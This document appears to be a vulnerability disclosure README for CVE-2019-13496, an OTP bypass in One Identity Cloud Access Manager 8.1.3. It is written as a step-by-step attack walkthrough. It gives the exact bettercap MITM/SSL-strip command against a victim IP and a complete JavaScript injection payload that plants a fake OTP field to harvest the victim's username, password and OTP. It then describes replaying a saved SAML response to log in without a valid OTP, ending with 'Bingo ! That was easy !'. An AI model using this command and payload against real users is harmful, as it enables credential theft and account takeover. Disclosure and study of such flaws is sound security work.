# CVE-2019-13496

Exploit Title:  OTP bypass (Filed Integrity check)<br>
Date: 07/10/2019<br>
Exploit Author: Furqan Khan<br>
Vendor Homepage: https://www.oneidentity.com/<br>
Software Link: https://www.oneidentity.com/products/cloud-access-manager/<br>
Version: 8.1.3<br>
Tested on: Kali Linux , Windows 7 ,Ubantu 16.04<br>

####  To exploit the OPT bypass vulnerability ,an attacker makes use of an earlier discovered vulnerability of MITM/SSL-Strip <a href="https://github.com/FurqanKhan1/CVE-2019-13498"> CVE-2019-13498 </a> , <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13498"> CVE-2019-13498 </a> .An attacker , conducts a MITM / SSL strip attack using which he can inject a OTP text box into the web page which is being served to the victim.A victim shares his username ,password and OTP generated form a app called as defender(which is owned by same vendor).The attacker intercepts the username , password and OTP and then tries to access the application via a legitimate workflow. After putting username and password (which were stolen) , the attacker puts the stolen OTP at next page. when submitting the request at OTP page the signed SAML response is saved.Now even tough attacker doesn't have access over the app that generates OTP , he can put invalid otp for successive transactions and while the application invalidates the OTP , the attacker can change the failed SAML response with earlier obtained legitimate SAML response , and the application failes to conduct an integrity check and logs in the attcaker.

## (1) First Step of the attcak is to conduct MITM/SSL-Strip which is captured under : <a href="https://github.com/FurqanKhan1/CVE-2019-13498"> CVE-2019-13498 </a>  , and is also specified as under : 
### The bettercap command used is :
##### bettercap -T 192.168.1.103 --proxy -P post --proxy-module injectjs --js-file inject_js.js ####

![bettercap.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/1.PNG)

Here 192.168.1.103 is the IP address of the victim. If we do not know it , we can use bettercap , to sniff and manipulate content of the entire LAN (common network of attacker and victim)

### The content of inject_js.js is given as under ##

```html
<script>
 
function replace_payload()
{  


     var append_str='<div class="wrap-input100 validate-input m-b-20" data-validate="Password"><input class="cui-textbox" type="password"  id="passwordTextbox" name="passwordTextbox"><span class="focus-cui-textbox" data-placeholder="OTP"></span></div>';

     var text_div=$(".m-b-20");

     text_div.append(append_str);

    }

    function control(){setTimeout(replace_payload,2000);} control();
    
</script>
```
##### Now when the victim would browse the product (Cloud access manager) , due to cache piosining and SSL strip (Bettercap) ,an OTP text box will be injected in the page that would be served to victim via the injected javascript snippet #####
![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/2.PNG)

##### Given that the connection is downgraded to http via ssl-strip , now all traffic shall be visible to the attacker.Thus we can intercept the traffic , and see the username , password and OTP submitted by victim. #####

![intercept.jpg](https://github.com/FurqanKhan1/CVE-2019-13498/blob/master/3.PNG)

####  Now lets assume that we have logged in once with the saved credentials and have saved all valid request and responses. 
####  In this section we will learn how we can used the earlier saved OTP response , to bypass the OTP validation which would lead us to login to the application.

##### Lets input an invalid OTP as showen under :
![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13496/blob/master/1.PNG)


##### Below shown is the response that fails the oTP validation. 
![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13496/blob/master/2_failed_otp.PNG)

##### Replace the failed response , with earlier saved legitimate response.

![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13496/blob/master/2_replace_failed_success.PNG)

##### Below shown is the SAML response that fails the oTP validation. 

![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13496/blob/master/3_failed_SAML_RESP.PNG)

##### Replace the failed response , with earlier saved legitimate SAML response.
![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13496/blob/master/3_success_resp.PNG)



##### Bingo , the application logs us in . Ideally it should have done an integrity check and should have taken it into account that the OTP has expired.
![injected.jpg](https://github.com/FurqanKhan1/CVE-2019-13496/blob/master/4_logged_in.PNG)


Bingo ! That was easy !
